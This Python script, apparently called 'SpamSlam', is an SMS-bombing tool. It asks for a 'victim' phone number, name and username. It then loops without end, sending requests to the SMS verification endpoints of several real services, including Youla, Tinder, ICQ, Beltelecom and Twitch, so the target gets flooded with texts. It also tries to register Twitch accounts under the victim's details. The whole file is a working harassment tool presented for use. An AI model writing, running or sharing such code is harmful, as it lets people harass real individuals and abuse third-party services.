import requests, random
from time import sleep
import urllib.request
import colorama

"""
---------------------------------------------------
Coder   : Ruben Parsons
Version : 1.0.0
Parsons IT Solutions
---------------------------------------------------

"""

colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']

print(random.choice(colors))

print("---------------------------------------------------")
print("SpamSlam")
print("Version : 1.0.0")
print("Coder   : Ruben Parsons")
print("Parsons IT Solutions")
print("---------------------------------------------------")

print("")

_phone   = input('Phone Number (International Format) :')
_name    = input('Victim Name : ')
username = input('Victim Username : ')

print("")

print("Starting Spam, texting : " + _phone)

print("")

print(random.choice(colors))

for x in range(12):
	
	password = _name + random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM123456789'))
	
_phone9 = _phone[1:]

num = _phone
numplus = '+' + num
print(random.choice(colors))
while True:
#1
    try:
        print(requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":numplus}))
    except:
        print("Spam Failed")
#2
    try:
        print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', json= {"phone_number":numplus}))
    except:
        print("Spam Failed")
#3
    try:
        print(requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php/?msisdn={}&locale=en&countryCode=ru&k=ic1rtwz1s1Hj1O0r&version=1&r=46763'.format(num)))
    except:
        print("Spam Failed")
#4
    try:
        print(requests.post('https://account.my.games/signup_send_sms/', data={'phone': _phone}))
    except:
        print("Spam Failed")
#5
    try:
        print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={}))
    except:
        print("Spam Failed")
#6
    try:
        print(requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone}))
    except:
        print("Spam Failed")
#7
    try:
        print(requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 1, "month": 4, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}))
    except:
        print("Spam Failed")
#8
    try:
        print(requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone}))
    except:
        print("Spam Failed")
    print(random.choice(colors))
